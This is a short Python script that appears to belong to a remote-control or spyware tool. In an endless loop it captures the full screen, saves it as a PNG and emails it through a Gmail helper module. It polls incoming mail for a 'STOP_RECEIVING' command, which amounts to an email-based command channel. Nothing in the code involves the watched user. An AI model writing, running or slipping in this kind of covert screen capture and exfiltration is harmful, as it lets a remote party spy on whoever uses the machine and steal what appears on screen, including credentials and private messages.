# Socket
import os

# Work with Image
from PIL import ImageGrab
import io
import gmail as g


def capture_screen():
    while True:
        img = ImageGrab.grab()
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        data = img_bytes.getvalue()
        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'livescreen', 'livescreen.png')
        with open(file_path, 'wb') as f:
            f.write(data)
        
        cmd = 'LIVESCREEN'
        g.send_message_with_attachment(cmd, file_path)
        # listen to next command from client: continue or back
        check_stop = g.read_mail()
        if("STOP_RECEIVING" in check_stop):
            break


            



